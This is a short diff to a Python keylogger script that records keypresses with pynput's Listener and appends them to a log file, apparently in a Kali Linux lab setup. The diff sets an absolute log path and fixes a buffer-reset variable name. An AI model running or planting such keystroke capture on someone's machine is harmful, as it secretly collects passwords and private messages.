@@ -6,7 +6,7 @@ import zc.lockfile
 from pynput.keyboard import Listener
 
 lock = zc.lockfile.LockFile('anything.py')
-path = 'keyboard_Input.txt'
+path = '/home/kali/Desktop/scripts/keyboard_Input.txt'
 keyboard_Input = []
 count = 0
 
@@ -18,7 +18,7 @@ def on_press(key):
     if count > 0:
         count = 0
         write_to_file(keyboard_Input)
-        keyboardInput = []
+        keyboard_Input = []
 
 def write_to_file(keys):
     with open(path, 'a') as file:
